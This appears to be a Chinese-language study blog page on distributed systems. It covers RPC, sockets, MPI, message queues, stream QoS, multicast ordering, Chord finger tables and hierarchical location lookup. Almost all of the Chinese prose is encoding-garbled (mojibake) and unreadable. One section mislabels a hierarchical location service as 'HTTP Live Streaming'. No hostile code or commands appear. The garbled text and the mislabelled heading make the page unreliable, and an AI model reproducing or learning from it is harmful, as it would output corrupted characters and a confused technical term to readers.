<p>å¼‚æ­¥RPCæ•ˆç‡é«˜ï¼Œä½†æ˜¯éš¾ç¼–ç¨‹ã€‚</p>
<p><strong>å»¶è¿Ÿçš„åŒæ­¥RPC</strong>ï¼š</p>
<p>å°±æ˜¯ä¸¤ä¸ªå¼‚æ­¥RPCç»“åˆèµ·æ¥ã€‚</p>
<p>è¿œç¨‹æœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶ï¼Œå®¢æˆ·åŒæ—¶åšä¸€äº›å…¶ä»–çš„äº‹æƒ…ã€‚å½“æœåŠ¡å™¨å¤„ç†å¥½è¯·æ±‚æ—¶ï¼Œè¿”å›ç»“æœå»ä¸­æ–­å®¢æˆ·ï¼ŒæœåŠ¡å™¨ä¸€ç«¯å˜æˆå‘é€ç«¯ï¼Œå®ç°ç¬¬äºŒä¸ªå¼‚æ­¥RPCã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451765.png" alt="img"></p>
<h2 id="é¢å‘æ¶ˆæ¯çš„é€šä¿¡-Message-oriented-Communication"><a href="#é¢å‘æ¶ˆæ¯çš„é€šä¿¡-Message-oriented-Communication" class="headerlink" title="é¢å‘æ¶ˆæ¯çš„é€šä¿¡ - Message-oriented Communication"></a>é¢å‘æ¶ˆæ¯çš„é€šä¿¡ - Message-oriented Communication</h2><h3 id="å¥—æ¥å­—"><a href="#å¥—æ¥å­—" class="headerlink" title="å¥—æ¥å­—"></a>å¥—æ¥å­—</h3><p>ä¸€ç§é€šä¿¡ç«¯ç‚¹ã€‚å¦‚æœåº”ç”¨ç¨‹åºè¦é€šè¿‡åº•å±‚ç½‘ç»œå‘é€æŸäº›æ•°æ®ï¼Œå¯ä»¥æŠŠè¿™äº›æ•°æ®å†™å…¥å¥—æ¥å­—ï¼Œç„¶åä»å¥—æ¥å­—è¯»å‡ºæ•°æ®ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451766.png" alt="pastedGraphic.png"></p>
<p>æœåŠ¡å™¨ä¸€èˆ¬æ‰§è¡Œå‰4ä¸ªåŸè¯­ï¼Œä¸€èˆ¬æŒ‰ç…§å›¾ä¸­é¡ºåºæ‰§è¡Œã€‚è°ƒç”¨å¥—æ¥å­—åŸè¯­çš„æ—¶å€™ï¼Œè°ƒç”¨è€…åˆ›å»ºä¸€ä¸ªæ–°çš„é€šä¿¡ç«¯ç‚¹ï¼Œç”¨äºæŸç§ç‰¹å®šçš„ä¼ è¾“åè®®çš„ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451767.png" alt="img"></p>
<h3 id="æ¶ˆæ¯ä¼ é€’æ¥å£-MPI"><a href="#æ¶ˆæ¯ä¼ é€’æ¥å£-MPI" class="headerlink" title="æ¶ˆæ¯ä¼ é€’æ¥å£ MPI"></a>æ¶ˆæ¯ä¼ é€’æ¥å£ MPI</h3><p><strong>MPI</strong>çš„å…ˆè¿›ä¹‹å¤„ï¼š</p>
<p>ç¨‹åºçš„ç¡¬ä»¶ç‹¬ç«‹æ€§éœ€è¦å¯¼è‡´MPIçš„å‡ºå°ã€‚MPIæ˜¯ä¸ºå¹¶è¡Œåº”ç”¨ç¨‹åºè®¾è®¡çš„ï¼Œæ˜¯ä¸ºç¬æ—¶é€šä¿¡é‡èº«å®šåšçš„ã€‚å®ƒç›´æ¥ä½¿ç”¨çš„æ˜¯åº•å±‚ç½‘ç»œã€‚</p>
<p>MPIæ˜¯å¹¶è¡Œè®¡ç®—ï¼Œä¸€èˆ¬è¿è¡Œäºé›†ç¾¤ä¸­ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451769.png" alt="img"></p>
<h3 id="æ¶ˆæ¯é˜Ÿåˆ—ç³»ç»Ÿ"><a href="#æ¶ˆæ¯é˜Ÿåˆ—ç³»ç»Ÿ" class="headerlink" title="æ¶ˆæ¯é˜Ÿåˆ—ç³»ç»Ÿ"></a>æ¶ˆæ¯é˜Ÿåˆ—ç³»ç»Ÿ</h3><p>é¢å‘æ¶ˆæ¯çš„ä¸­é—´ä»¶æœåŠ¡ã€‚ä¸ºæŒä¹…å¼‚æ­¥é€šä¿¡æä¾›å¤šç§æ”¯æŒã€‚<strong>æœ¬è´¨</strong>æ˜¯ï¼Œæä¾›æ¶ˆæ¯çš„ä¸­ä»‹å­˜å‚¨èƒ½åŠ›ï¼Œè¿™æ ·å°±ä¸éœ€è¦æ¶ˆæ¯å‘é€æ–¹å’Œæ¥æ”¶æ–¹åœ¨æ¶ˆæ¯ä¼ è¾“ä¸­éƒ½ä¿æŒæ¿€æ´»çŠ¶æ€ã€‚ä¸å¥—æ¥å­—å’ŒMPIçš„é‡è¦<strong>åŒºåˆ«</strong>åœ¨äºï¼Œå®ƒçš„è®¾è®¡ç›®æ ‡ä¸€èˆ¬æ˜¯æ”¯æŒé‚£äº›æ—¶é—´è¦æ±‚è¾ƒä¸ºå®½æ¾çš„æ¶ˆæ¯ä¼ è¾“ï¼Œä¸é€‚åˆå‡ ç§’ç”šè‡³å‡ å¾®ç§’å†…è¦å®Œæˆçš„ä¼ è¾“ã€‚</p>
<h2 id="é¢å‘æµçš„é€šä¿¡-Stream-oriented-Communication"><a href="#é¢å‘æµçš„é€šä¿¡-Stream-oriented-Communication" class="headerlink" title="é¢å‘æµçš„é€šä¿¡ - Stream-oriented Communication"></a>é¢å‘æµçš„é€šä¿¡ - Stream-oriented Communication</h2><h3 id="æµçš„å®šä¹‰"><a href="#æµçš„å®šä¹‰" class="headerlink" title="æµçš„å®šä¹‰"></a>æµçš„å®šä¹‰</h3><blockquote>
<p>A (continuous) data stream is a connection oriented communication facility that supports isochronous data transmission</p>
</blockquote>
<ul>
<li><p><strong>ç®€å•æµ</strong>ï¼š</p>
<p>åªåŒ…å«å•ä¸ªæ•°æ®åºåˆ—ï¼›</p>
</li>
<li><p><strong>å¤æ‚æµ</strong>ï¼š</p>
<p>ç®€å•æµçš„ç»„åˆ</p>
</li>
</ul>
<h3 id="ä¼ è¾“æ¨¡å¼"><a href="#ä¼ è¾“æ¨¡å¼" class="headerlink" title="ä¼ è¾“æ¨¡å¼"></a>ä¼ è¾“æ¨¡å¼</h3><ul>
<li><p><strong>å¼‚æ­¥ä¼ è¾“æ¨¡å¼</strong>ï¼š</p>
<p>æµä¸­çš„æ•°æ®é¡¹æ˜¯é€ä¸ªä¼ è¾“çš„ï¼Œä½†æ˜¯å¯¹æŸä¸€é¡¹åœ¨ä½•æ—¶è¿›è¡Œä¼ è¾“å¹¶æ²¡æœ‰è¿›ä¸€æ­¥çš„é™åˆ¶ã€‚è¿™æ˜¯é‡‡ç”¨ç¦»æ•£æ•°æ®æµæ—¶å¸¸è§çš„æƒ…å†µã€‚æ¯”å¦‚æ–‡ä»¶çš„ä¼ è¾“ã€‚</p>
</li>
<li><p><strong>åŒæ­¥ä¼ è¾“æ¨¡å¼</strong>ï¼š</p>
<p>æ•°æ®æµä¸­æ¯ä¸€ä¸ªå•å…ƒéƒ½å®šä¹‰äº†ä¸€ä¸ªç«¯åˆ°ç«¯çš„æœ€å¤§å»¶è¿Ÿæ—¶é—´ï¼Œå®¹è®¸å»¶è¿Ÿã€‚æ•°æ®å•å…ƒçš„ä¼ è¾“æ—¶é—´æ˜¯å¦è¿œè¿œå°äºæœ€å¤§å…è®¸å»¶è¿Ÿå¹¶ä¸é‡è¦ã€‚</p>
</li>
<li><p><strong>ç­‰æ—¶ä¼ è¾“æ¨¡å¼</strong>ï¼š</p>
<p>æ•°æ®å•å…ƒå¿…é¡»æŒ‰æ—¶ä¼ è¾“ï¼Œç«¯åˆ°ç«¯çš„å»¶è¿Ÿæ—¶é—´åŒæ—¶æœ‰ä¸Šé™å’Œä¸‹é™ã€‚è¿™ä¸ªä¸Šã€ä¸‹é™ä¹Ÿç§°ä¸ºè¾¹ç•Œå»¶è¿ŸæŠ–åŠ¨ã€‚åœ¨è§†é¢‘å’ŒéŸ³é¢‘æ–¹é¢å¾ˆå¸¸ç”¨ï¼Œæ¯”å¦‚éŸ³è§†é¢‘çš„åŒæ­¥(å¯¹å£å‹)ã€‚</p>
<p>æµåª’ä½“å°±å±äºè¿™ä¸ªç±»ï¼Œæ—¢æœ‰æœ€å¤§ç«¯åˆ°ç«¯å»¶è¿Ÿé™åˆ¶ï¼Œåˆæœ‰æœ€å°çš„ç«¯åˆ°ç«¯å»¶è¿Ÿé™åˆ¶ã€‚</p>
</li>
</ul>
<h3 id="æµä¸æœåŠ¡è´¨é‡"><a href="#æµä¸æœåŠ¡è´¨é‡" class="headerlink" title="æµä¸æœåŠ¡è´¨é‡"></a>æµä¸æœåŠ¡è´¨é‡</h3><h4 id="QoSæœåŠ¡è´¨é‡ï¼š"><a href="#QoSæœåŠ¡è´¨é‡ï¼š" class="headerlink" title="QoSæœåŠ¡è´¨é‡ï¼š"></a>QoSæœåŠ¡è´¨é‡ï¼š</h4><ol>
<li>æ•°æ®ä¼ è¾“æ‰€è¦æ±‚çš„æ¯”ç‰¹ç‡ï¼›</li>
<li>åˆ›å»ºä¼šè¯çš„æœ€å¤§å»¶æ—¶(æ¯”å¦‚åº”ç”¨ç¨‹åºä½•æ—¶å¯ä»¥å¼€å§‹å‘é€æ•°æ®)ï¼›</li>
<li>ç«¯åˆ°ç«¯çš„æœ€å¤§å»¶æ—¶ï¼›</li>
<li>æœ€å¤§å»¶æ—¶æŠ–åŠ¨ï¼›</li>
<li>æœ€å¤§å¾€è¿”å»¶æ—¶ã€‚</li>
</ol>
<h4 id="QoSä¿è¯ï¼š"><a href="#QoSä¿è¯ï¼š" class="headerlink" title="QoSä¿è¯ï¼š"></a>QoSä¿è¯ï¼š</h4><ul>
<li><p>ä½¿ç”¨ buffer æ¥å‡å°‘ jitter</p>
<p>å½“æ•°æ®åŒ…æœ‰ä¸åŒçš„å»¶æ—¶ï¼Œæ¥æ”¶æ–¹å…ˆæŠŠå®ƒä»¬å­˜å‚¨åœ¨ç¼“å†²åŒºï¼Œå½“æ€»æ˜¯æœ‰è¶³å¤Ÿçš„æ•°æ®åŒ…è¿›å…¥ç¼“å†²åŒºæ—¶ï¼Œæ¥æ”¶æ–¹å°±å¯ä»¥ä»¥å›ºå®šçš„é€Ÿç‡æŠŠæ•°æ®åŒ…ä¼ é€’ç»™åº”ç”¨ç¨‹åºã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451770.png" alt="img"></p>
</li>
<li><p>é’ˆå¯¹ä¸¢åŒ…æƒ…å†µï¼Œinterleavingï¼Œè‹¥æ²¡æœ‰äº¤é”™æœºåˆ¶ï¼Œä¸¢åŒ…æ—¶ä¼šæŠŠè¿ç»­çš„å‡ å¸§ä¸€èµ·ä¸¢æ‰ï¼Œè§†è§‰å½±å“è¾ƒå¤§ï¼›è€Œä½¿ç”¨äº¤é”™æœºåˆ¶ï¼Œä¼šäº¤å‰ä¸¢åŒ…ã€‚</p>
<p>å¦‚åœ¨ä¼ é€éŸ³è§†é¢‘æ—¶ï¼Œé‡‡ç”¨äº¤é”™ä¼ è¾“ï¼Œä¸¢å¤±çš„å¸§åˆ†å¸ƒè¾ƒå¹¿ï¼Œè¿™æ ·ä¸¢å¤±çš„å°±ä¸æ˜¯ä¸€å¤§æ®µè€Œæ˜¯é›¶æ•£çš„å¸§ï¼Œå¯¹äºéŸ³è§†é¢‘çš„æ’­æ”¾å½±å“å°±è¾ƒå°ã€‚ä½†æ˜¯è¿™æ ·éœ€è¦æ›´å¤§çš„ç¼“å†²åŒºï¼Œå› æ­¤ç¨‹åºçš„å¼€å§‹å»¶æ—¶æ›´é«˜ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451771.png" alt="img"></p>
</li>
</ul>
<h3 id="æµåŒæ­¥"><a href="#æµåŒæ­¥" class="headerlink" title="æµåŒæ­¥"></a>æµåŒæ­¥</h3><p><strong>éŸ³è§†é¢‘æµåŒæ­¥</strong></p>
<p>é‡‡ç”¨éŸ³è§†é¢‘çš„ç¼–è§£ç åè®®ï¼š<strong>H264åè®®</strong></p>
<h2 id="å¤šæ’­é€šä¿¡-Communication"><a href="#å¤šæ’­é€šä¿¡-Communication" class="headerlink" title="å¤šæ’­é€šä¿¡ - Communication"></a>å¤šæ’­é€šä¿¡ - Communication</h2><h3 id="Gossip-Based-Data-Dissemination"><a href="#Gossip-Based-Data-Dissemination" class="headerlink" title="Gossip-Based Data Dissemination"></a>Gossip-Based Data Dissemination</h3><p>å±äºp2pç³»ç»Ÿçš„å¤šæ’­ã€‚</p>
<p>åº”ç”¨åœ¨è‡ªä¸»ç½‘æˆ–æ˜¯p2pï¼Œå°±æ˜¯æ²¡æœ‰æœåŠ¡å™¨çš„é‚£ä¸€ç±»ç½‘ã€‚</p>
<h3 id="å‡ ç§å¤šæ’­"><a href="#å‡ ç§å¤šæ’­" class="headerlink" title="å‡ ç§å¤šæ’­"></a>å‡ ç§å¤šæ’­</h3><ul>
<li><p>å…¨åºå¤šæ’­ Total order</p>
</li>
<li><p>FIFOå¤šæ’­</p>
<p>é€šä¿¡å±‚è¢«å¼ºåˆ¶æŒ‰ç…§æ¶ˆæ¯å‘é€çš„é¡ºåºä¼ é€æ¥è‡ª<strong>åŒä¸€è¿›ç¨‹</strong>çš„æ¶ˆæ¯ï¼Œå¯¹ä¸åŒè¿›ç¨‹ä¹‹é—´çš„é¡ºåºä¸ä½œè¦æ±‚ã€‚</p>
<p><strong>ä¾‹ï¼š</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451772.png" alt="image-20190420152021420"></p>
<p>ä¸ä¿è¯m1å’Œm3ä¹‹é—´çš„é¡ºåºï¼Œæ‰€ä»¥å¯¹äºP2å’ŒP3ï¼Œåªè¦m1åœ¨m2ä¹‹å‰ï¼Œm3åœ¨m4ä¹‹å‰ï¼Œå°±ç®—æ»¡è¶³è¦æ±‚ã€‚</p>
</li>
<li><p>Causal å› æœåºå¤šæ’­</p>
</li>
</ul>
<hr>
<h1 id="Chapter-5-å‘½åç³»ç»Ÿ-Naming"><a href="#Chapter-5-å‘½åç³»ç»Ÿ-Naming" class="headerlink" title="Chapter 5 å‘½åç³»ç»Ÿ - Naming"></a>Chapter 5 å‘½åç³»ç»Ÿ - Naming</h1><blockquote>
<p>å‘½åæ˜¯åœ¨åˆ†å¸ƒå¼ä¸­è¡¨ç¤ºè¿™ä¸ªå®ä½“ï¼Œä¸”è¦è®¿é—®åˆ°è¿™ä¸ªå®ä½“ã€‚</p>
</blockquote>
<ul>
<li>è®¿é—®ç‚¹ï¼šç”¨æ¥å®ä½“çš„ä¸€ç§ç‰¹æ®Šå®ä½“ã€‚</li>
<li>åœ°å€ï¼šè®¿é—®ç‚¹çš„åç§°ã€‚</li>
</ul>
<p>æ‰€ä»¥<strong>è®¿é—®ç‚¹</strong>å°±æ˜¯å®ä½“çš„<strong>åœ°å€</strong>ã€‚</p>
<h2 id="DHT"><a href="#DHT" class="headerlink" title="DHT"></a>DHT</h2><p>å…¨ç§°æ˜¯Distributed Hash Tablesï¼Œæ˜¯P2Pç¯å¢ƒä¸‹æœ€ç»å…¸çš„è§£å†³æ–¹æ¡ˆ</p>
<h3 id="Chord"><a href="#Chord" class="headerlink" title="Chord"></a>Chord</h3><p>ä½¿ç”¨ä¸€ä¸ªmä½çš„æ ‡è¯†ç¬¦ç©ºé—´ï¼ŒæŠŠ<strong>éšæœºé€‰æ‹©</strong>çš„æ ‡è¯†ç¬¦èµ‹ç»™ç»“ç‚¹ï¼Œå¹¶æŠŠé”®å€¼èµ‹å€¼ç»™ç‰¹å®šå®ä½“ï¼ˆä»»æ„çš„ä¸œè¥¿ï¼Œæ¯”å¦‚æ–‡ä»¶ã€è¿›ç¨‹ï¼‰ã€‚</p>
<p><strong>æ„é€ Finger tableç®—æ³•ï¼š</strong></p>
<p>æ¯ä¸ªChordç»“ç‚¹ç»´æŠ¤ä¸€ä¸ªæœ€å¤šæœ‰mä¸ªå®ä½“çš„æŒ‡çŠ¶è¡¨(Finger table)ï¼Œå¦‚æœç”¨$FT_p$è¡¨ç¤ºç»“ç‚¹$p$çš„æŒ‡çŠ¶è¡¨ï¼Œé‚£ä¹ˆæœ‰ï¼š<br>$$<br>FT_p[i]&#x3D;succ(p + 2^{i -1})<br>$$</p>
<ul>
<li>$p$æ˜¯å½“å‰ç»“ç‚¹</li>
<li>$i$æ˜¯æŒ‡çŠ¶è¡¨çš„index</li>
<li>$succ(k)$è¡¨ç¤ºkï¼ˆè‹¥ç»“ç‚¹kå­˜åœ¨ï¼‰æˆ–kçš„ä¸‹ä¸€ä¸ª<strong>å­˜åœ¨</strong>çš„ç»“ç‚¹ï¼Œå³$succ(k)\geq k$</li>
</ul>
<p>ä¾‹ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451773.png" alt="img"></p>
<p>æ ¹æ®$FT_p[i] &#x3D; succ(p + 2^{i - 1})$å…¬å¼ï¼Œæ„é€ ç»“ç‚¹p&#x3D;4çš„Finger tableï¼š</p>
<table>
<thead>
<tr>
<th align="center">$i$</th>
<th align="center">$FT_p[i]$</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">$succ(4+1)&#x3D;9$</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">$succ(4 + 2)&#x3D;9$</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">$succ(4+4)&#x3D;9$</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">$succ(4+8)&#x3D;14$</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">$succ(4+16)&#x3D;20$</td>
</tr>
</tbody></table>
<p><strong>è§£æç®—æ³•ï¼š</strong></p>
<p>ç›®æ ‡ï¼šä»èŠ‚ç‚¹på¼€å§‹è§£ækey&#x3D;kçš„ç»“ç‚¹</p>
<p>æœç´¢èŠ‚ç‚¹pçš„Finger tableï¼Œä»ä¸Šä¾æ¬¡å‘ä¸‹æœç´¢ï¼Œå¦‚æœä¸€ä¸ªç»“ç‚¹qæ»¡è¶³ï¼š<br>$$<br>q &#x3D; FT_p[j]\leq k&lt;FT_p[j+1]<br>$$</p>
<p>é‚£ä¹ˆå°±å°†è¯¥è¯·æ±‚è½¬å‘ç»™ç»“ç‚¹qï¼›</p>
<p>å¦‚æœpçš„Finger tableç¬¬ä¸€ä¸ªç»“ç‚¹å°±æ¯”kè¿˜å¤§ï¼Œå³ï¼š<br>$$<br>p &lt; k &lt; FT_p[1]<br>$$<br>é‚£ä¹ˆå°±è½¬å‘ç»™$FT_p[1]$ç»“ç‚¹ï¼Œæ­¤èŠ‚ç‚¹è´Ÿè´£ç»“ç‚¹kï¼Œå°†kçš„åœ°å€è¿”å›ç»™ç»“ç‚¹pã€‚</p>
<p><strong>ä¾‹ï¼š</strong></p>
<p>è¿˜æ˜¯ä¸Šé¢é‚£ä¸ªå›¾</p>
<p>ä»ç»“ç‚¹1å¼€å§‹è§£æk&#x3D;26ï¼š</p>
<ol>
<li>ç»“ç‚¹1çš„æŒ‡çŠ¶è¡¨é‡Œï¼Œ$FT_1[5]&#x3D;18\le26$ï¼Œå°†è¯·æ±‚è½¬å‘ç»™18ï¼›</li>
<li>ç»“ç‚¹18çš„æŒ‡çŠ¶è¡¨é‡Œï¼Œ$FT_{18}[2]&#x3D;20\le 26 &lt; FT_{18}[3]&#x3D;28$ï¼Œå°†è¯·æ±‚è½¬å‘ç»™20ï¼›</li>
<li>ç»“ç‚¹20çš„æŒ‡çŠ¶è¡¨é‡Œï¼Œ$FT_{20}[1]&#x3D;21\le26&lt;FT_{20}[2]&#x3D;28$ï¼Œå°†è¯·æ±‚è½¬å‘ç»™21ï¼›</li>
<li>ç»“ç‚¹21çš„æŒ‡çŠ¶è¡¨é‡Œï¼Œ$21 &lt; 26 &lt;FT_{21}[1]&#x3D;28$ï¼Œå°†è¯·æ±‚è½¬å‘ç»™28ï¼Œè¯¥ç»“ç‚¹è´Ÿè´£è§£æk&#x3D;26ï¼›</li>
</ol>
<p>ä»ç»“ç‚¹28å¼€å§‹è§£æk&#x3D;12ï¼š</p>
<ol>
<li>ç»“ç‚¹28çš„æŒ‡çŠ¶è¡¨é‡Œï¼Œ$FT_{28}[4]&#x3D;4\le 12&lt;FT_{28}[5]&#x3D;14$ï¼Œå°†è¯·æ±‚è½¬å‘ç»™4ï¼›</li>
<li>ç»“ç‚¹4çš„æŒ‡çŠ¶è¡¨é‡Œï¼Œ$FT_{4}[3]&#x3D;9\le 12&lt;FT_{4}[4]&#x3D;14$ï¼Œå°†è¯·æ±‚è½¬å‘ç»™9ï¼›</li>
<li>ç»“ç‚¹9çš„æŒ‡çŠ¶è¡¨é‡Œï¼Œ$FT_{9}[2]&#x3D;11\le 12&lt;FT_{9}[3]&#x3D;14$ï¼Œå°†è¯·æ±‚è½¬å‘ç»™11ï¼›</li>
<li>ç»“ç‚¹11çš„æŒ‡çŠ¶è¡¨é‡Œï¼Œ$11 &lt; 12 &lt;FT_{11}[1]&#x3D;14$ï¼Œå°†è¯·æ±‚è½¬å‘ç»™14ï¼Œè¯¥ç»“ç‚¹è´Ÿè´£è§£æk&#x3D;12ï¼›</li>
</ol>
<h2 id="HLS-HTTP-Live-Streaming"><a href="#HLS-HTTP-Live-Streaming" class="headerlink" title="HLS(HTTP Live Streaming)"></a>HLS(HTTP Live Streaming)</h2><p>ç½‘ç»œè¢«åˆ’åˆ†ä¸ºä¸€ç»„åŸŸã€‚æ¯ä¸ªåŸŸDéƒ½æœ‰å…³è”çš„ç›®å½•èŠ‚ç‚¹dir(D)ï¼Œdir(D)ä¼šè·Ÿè¸ªåŸŸä¸­çš„å®ä½“ï¼Œå½¢æˆä¸€é¢—ç›®å½•ç»“ç‚¹æ ‘ã€‚</p>
<h3 id="HLSç»“æ„"><a href="#HLSç»“æ„" class="headerlink" title="HLSç»“æ„"></a>HLSç»“æ„</h3><p>çœ‹ä¸‹é¢è¿™ä¸ªå›¾æ¥è§£é‡Šä¸€ä¸‹HLSå§ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451774.png" alt="image-20190417105530318"></p>
<p>ä¸ºäº†è·Ÿè¸ªå®ä½“Eçš„ä½ç½®ï¼Œå®ä½“Eä½äºåŸŸSä¸­ï¼Œæ‰€ä»¥åŸŸSçš„ç›®å½•ç»“ç‚¹Nå«æœ‰Eåœ¨è¯¥åŸŸä¸­çš„ä½ç½®ä¿¡æ¯ã€‚</p>
<p>è€Œåœ¨æ¯”åŸŸSæ›´é«˜ä¸€çº§çš„åŸŸTä¸­ï¼ŒåŸŸTçš„ç›®å½•ç»“ç‚¹Nâ€™ä¹Ÿæœ‰å®ä½“Eçš„ä½ç½®ä¿¡æ¯ï¼Œä½†æ˜¯è¿™ä¸ªä½ç½®ä¿¡æ¯åªæœ‰Nçš„æŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯è¦æ‰¾å®ä½“Eï¼Œå°±å…ˆå»æ‰¾åˆ°å…¶å­åŸŸçš„ç›®å½•ç»“ç‚¹Nï¼Œç„¶åé€šè¿‡ç›®å½•èŠ‚ç‚¹Næ‰¾åˆ°Eã€‚</p>
<p>åŒç†ï¼Œåœ¨æ¯”åŸŸTæ›´å¤§çš„åŸŸä¸­ï¼Œé‚£ä¸ªåŸŸçš„ç›®å½•èŠ‚ç‚¹ä¹Ÿæœ‰å®ä½“Eçš„ä½ç½®ä¿¡æ¯ï¼Œä¸è¿‡è¿™ä¸ªä½ç½®ä¿¡æ¯åªæœ‰Nâ€™çš„æŒ‡é’ˆï¼Œè¦æ‰¾å®ä½“Eï¼Œå°±è¦å…ˆæ‰¾Nâ€™ï¼Œç„¶åæ‰¾åˆ°Nï¼Œæœ€åæ‰¾åˆ°Eã€‚</p>
<p>æ‰€ä»¥é¡¶çº§åŸŸçš„ç›®å½•ç»“ç‚¹ï¼Œå³æ ¹ï¼ˆç›®å½•ï¼‰èŠ‚ç‚¹ï¼ŒåŒ…æ‹¬å…¨éƒ¨å®ä½“ä½ç½®ä¿¡æ¯ã€‚</p>
<h3 id="å¦‚æœä¸€ä¸ªå®ä½“æœ‰å¤šä¸ªåœ°å€"><a href="#å¦‚æœä¸€ä¸ªå®ä½“æœ‰å¤šä¸ªåœ°å€" class="headerlink" title="å¦‚æœä¸€ä¸ªå®ä½“æœ‰å¤šä¸ªåœ°å€"></a>å¦‚æœä¸€ä¸ªå®ä½“æœ‰å¤šä¸ªåœ°å€</h3><p>å®ä½“å¯ä»¥æ‹¥æœ‰å¤šä¸ªåœ°å€ï¼Œæ¯”å¦‚è¢«å¤åˆ¶äº†ï¼Œå®ä½“åœ¨åŸŸD1å’ŒåŸŸD2ä¸­éƒ½æœ‰åœ°å€ï¼Œé‚£ä¹ˆåŒæ—¶åŒ…å«D1å’ŒD2çš„æœ€å°åŸŸç›®å½•ç»“ç‚¹å°†æœ‰ä¸¤ä¸ªæŒ‡é’ˆï¼Œæ¯ä¸ªæŒ‡é’ˆéƒ½æŒ‡å‘ä¸€ä¸ªåŒ…å«åœ°å€çš„å­åŸŸã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451775.png" alt="image-20190417110841084"></p>
<h3 id="HLSæŸ¥è¯¢æ“ä½œ"><a href="#HLSæŸ¥è¯¢æ“ä½œ" class="headerlink" title="HLSæŸ¥è¯¢æ“ä½œ"></a>HLSæŸ¥è¯¢æ“ä½œ</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451776.png" alt="image-20190417111032790"></p>
<p>ç°åœ¨å¸Œæœ›èƒ½å®šä½å®ä½“Eçš„ä½ç½®ä¿¡æ¯ï¼Œé‚£ä¹ˆå°±å‘å½“å‰åŸŸçš„ç›®å½•ç»“ç‚¹å‘é€æŸ¥æ‰¾è¯·æ±‚ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ç›®å½•ç»“ç‚¹æ‰¾åˆ°äº†å®ä½“Eçš„ä½ç½®ä¿¡æ¯:</span><br><span class="line">	if æ‰¾åˆ°çš„æ˜¯å­åŸŸç›®å½•ç»“ç‚¹çš„åœ°å€</span><br><span class="line">		æŠŠæŸ¥æ‰¾è¯·æ±‚è½¬å‘ç»™å­åŸŸçš„ç›®å½•ç»“ç‚¹</span><br><span class="line">	else </span><br><span class="line">		æ‰¾åˆ°äº†å¶èŠ‚ç‚¹ï¼ŒæŠŠåœ°å€è¿”å›ç»™è¯·æ±‚çš„å®¢æˆ·</span><br><span class="line">else</span><br><span class="line">	æŠŠæŸ¥æ‰¾è¯·æ±‚è½¬å‘ç»™çˆ¶èŠ‚ç‚¹</span><br></pre></td></tr></table></figure>

<p>æœ€å·®æƒ…å†µæ˜¯ä¸€ç›´æ‰¾ä¸åˆ°ï¼Œå‘ä¸Šè½¬å‘ç›´åˆ°æ ¹èŠ‚ç‚¹ã€‚</p>
<h3 id="æ’å…¥æ“ä½œ"><a href="#æ’å…¥æ“ä½œ" class="headerlink" title="æ’å…¥æ“ä½œ"></a>æ’å…¥æ“ä½œ</h3><p><strong>è¿™å—ä¸è¦çœ‹ä¸­æ–‡æ•™æï¼å› ä¸ºæ•™ææŠŠå›¾ç”¨é”™äº†ï¼(çœŸçš„å‘)</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451777.png" alt="image-20190417113202813"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451778.png" alt="image-20190417113211529"></p>
<p>å¦‚æœè¦æ’å…¥å®ä½“Eï¼Œå°†å…¶æ‰€åœ¨åŸŸçš„ç›®å½•èŠ‚ç‚¹åŠ å…¥å®ä½“Eçš„åœ°å€ï¼Œç„¶åä¸€è·¯å‘ä¸Šè½¬å‘ã€‚</p>
<p>å¦‚æœè¿™ä¸ªç›®å½•ç»“ç‚¹ä¸çŸ¥é“Eï¼Œå°±å­˜å‚¨ä¸€ä¸‹å­åŸŸåœ°å€ï¼Œç›´åˆ°ä¸€ä¸ªèŠ‚ç‚¹çŸ¥é“Eçš„ä½ç½®æˆ–è€…åˆ°æ ¹èŠ‚ç‚¹å°±ç»ˆæ­¢ã€‚</p>
<p><strong>ä¸ºå•¥åˆšåˆšæ’å…¥çš„å®ä½“Eï¼Œå¯èƒ½æœ‰çš„ç»“ç‚¹å·²ç»çŸ¥é“Eçš„ä½ç½®äº†å‘¢ï¼Ÿ</strong></p>
<p>å› ä¸ºEå¯èƒ½æ˜¯å¤åˆ¶è¿‡æ¥çš„ï¼Œæ­£å¦‚ä¸Šé¢è®²çš„æœ‰å¤šä¸ªå®ä½“ï¼ŒåŒ…å«ä¸¤ä¸ªEçš„æœ€å°åŸŸçš„ç›®å½•èŠ‚ç‚¹ä¼šæœ‰Eçš„ä¸¤ä¸ªåœ°å€ï¼Œè€Œå†å¾€ä¸Šä¸€å±‚ï¼Œå°±åªæœ‰Eçš„ä¸€ä¸ªåœ°å€äº†(æŒ‡å‘ä¸¤ä¸ªEçš„æœ€å°åŸŸçš„ç›®å½•èŠ‚ç‚¹)ï¼Œåˆ°è¿™é‡Œå°±åœæ­¢å‘ä¸Šä¼ é€’ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451779.png" alt="image-20190417113836041"></p>
